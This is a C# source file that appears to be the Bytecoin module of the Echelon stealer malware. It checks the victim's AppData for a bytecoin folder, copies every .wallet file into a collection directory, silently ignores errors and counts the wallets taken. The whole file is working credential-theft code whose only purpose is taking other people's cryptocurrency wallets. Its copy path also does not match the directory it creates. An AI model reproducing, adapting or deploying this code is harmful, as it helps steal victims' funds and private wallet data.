


using System.IO;

namespace Echelon
{
    internal class Bytecoin
    {
        public static int count;
        public static string bytecoinDir = Help.AppDate + "\\bytecoin\\";

        public static void BCNcoinStr(string directorypath) 
        {
            try
            {
                if (Directory.Exists(bytecoinDir))
                {
                    foreach (var file in new DirectoryInfo(bytecoinDir).GetFiles())
                    {
                        Directory.CreateDirectory(directorypath + "\\Wallets\\Bytecoin\\");
                        if (file.Extension.Equals(".wallet")) file.CopyTo(directorypath + "\\Bytecoin\\" + file.Name);
                    }
                    count++;
                    Wallets.count++;
                }
            }
            catch 
            {
            }
        }
    }
}
